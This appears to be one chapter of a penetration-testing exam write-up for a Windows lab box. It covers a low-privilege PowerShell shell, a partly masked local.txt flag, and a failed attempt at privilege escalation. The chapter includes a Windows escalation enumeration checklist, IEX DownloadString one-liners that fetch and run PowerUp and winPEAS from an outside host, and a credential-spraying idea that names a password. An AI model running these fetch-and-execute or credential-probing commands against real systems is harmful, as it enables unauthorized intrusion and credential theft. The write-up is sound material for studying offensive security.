# 04 — Shell, `local.txt`, and the dead end

## 4.1 The console

Once `.\sasha` is accepted, the browser becomes a normal PowerShell prompt on `OSCP`:

```powershell
PS C:\Users\sasha\Documents> whoami
oscp\sasha

PS C:\Users\sasha\Documents> hostname
OSCP

PS C:\Users\sasha\Documents> $env:USERDOMAIN
OSCP

PS C:\Users\sasha\Documents> whoami /groups | findstr /i "admin"
```

The last command returns nothing — `sasha` is a plain user. That single check decides the next hour:
there is no administrative token to steal, so any escalation has to come from a **misconfiguration**
(service, scheduled task, credential, registry), not from token abuse.

## 4.2 The flag

```powershell
PS C:\Users\sasha\Documents> type C:\Users\sasha\Desktop\local.txt
6cc351e3e4f2572432************
```

Masked here on purpose; the file lives at the standard exam path:

| Host | Path | Flag |
|---|---|---|
| `192.168.91.111` | `C:\Users\sasha\Desktop\local.txt` | `6cc351e3e4f2572432************` |
| `192.168.91.111` | `C:\Users\Administrator\Desktop\proof.txt` | **not obtained** |

That is the first half of the box's points. The second half — `proof.txt` — requires `Administrator`
(or `SYSTEM`), and that step was never reached.

## 4.3 What was tried

Everything was tried from the PowerShell console: enumeration, local files, service and permission
checks. Nothing produced a path.

The standard standalone-Windows checklist for that console:

```powershell
# identity and privileges
whoami /all
whoami /priv

# local admins
net localgroup administrators

# stored credentials
cmdkey /list

# patch level and architecture
systeminfo
wmic qfe list brief

# services and their binary paths
Get-CimInstance win32_service | Select Name, StartName, PathName | Where-Object {$_.PathName -notlike "C:\Windows\*"}

# unquoted service paths / weak permissions
Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch '^".*"' -and $_.PathName -match ' '}

# scheduled tasks
schtasks /query /fo LIST /v

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# proof.txt anywhere on disk
Get-ChildItem C:\ -Recurse -Include proof.txt,local.txt -ErrorAction SilentlyContinue
```

Plus the automated passes:

```powershell
# PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.91/PowerUp.ps1')
Invoke-AllChecks
```

```powershell
# winPEAS
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.91/winPEASx64.ps1')
```

None of it produced a path. Which individual checks were run, and which came back negative, is not
documented — what is known is the conclusion, not the full enumeration log.

## 4.4 What the intended path might have been (speculation, not verified)

Everything in this section is **hypothesis**. No solution is documented for this box, so treat it as
a list of places to look if you meet it, not as a walkthrough.

| Hypothesis | Why it is plausible | How to test |
|---|---|---|
| Another credential in `emails.zip` belongs to a local admin | the archive held "some passwords", only one was used | read every message, try each against `nxc smb --local-auth` and `evil-winrm` |
| The IIS site runs as an identity with write access to something | `http.sys` + app pool, a static Nicepage site is an odd thing to run as a service | `Get-CimInstance win32_process -Filter "name='w3wp.exe'"`, then check ACLs |
| WAC's own configuration holds a credential | WAC needs to authorize users; its config is on disk | `C:\Windows\Web\PowerShellWebAccess\` and the `AuthorizationRules` XML |
| A service or task was created by the "backup" software | the share is called *Automatic BackUps*; something must run the backups | `schtasks /query`, `Get-Service` for non-Microsoft names |
| Credential reuse from the AD set | `sasha` is a name that could exist in `oscp.exam` too | `nxc smb` the DC with `sasha:Welcome1` |

The most likely of these, given how the box hands you mail, is the **first**: an archive of "all the
emails" that yields only one credential is suspicious, and the unused messages are the obvious place for
the administrator's password.

## 4.5 The exam lesson: partial credit is still credit

This box was left at `local.txt`. With the rest of the set already solved, time on one login page was
already too much. Stopping and banking the `local.txt` was the correct call.

What would have made it cheaper:

1. **`.\sasha` on the first try** (see [`03-wac-login.md`](03-wac-login.md)) — the username format was
   the whole cost of this box.
2. **Read the mail archive properly.** Skimming the archive is a note-to-self that it was not read.
   In an exam, every password in a leaked mailbox should be tried against every account, once,
   automatically.
3. **Time-box the enumeration.** PowerUp + winPEAS + the manual checklist above is about 30 minutes. If
   nothing fires, leave the box and return in the last hour — do not sit in a console watching
   `Invoke-AllChecks` scroll.

## 4.6 State of the box

| Item | Status |
|---|---|
| Foothold | ✅ null SMB → ZIP → mail → WAC |
| `local.txt` | ✅ obtained (masked) |
| Privilege escalation | ❌ not achieved |
| `proof.txt` | ❌ not obtained |
| Verdict | one flaw, no escalation |

---

**Next:** the box overview in [`README.md`](README.md), or the full lab index at
[`../../main.html`](../../main.html).
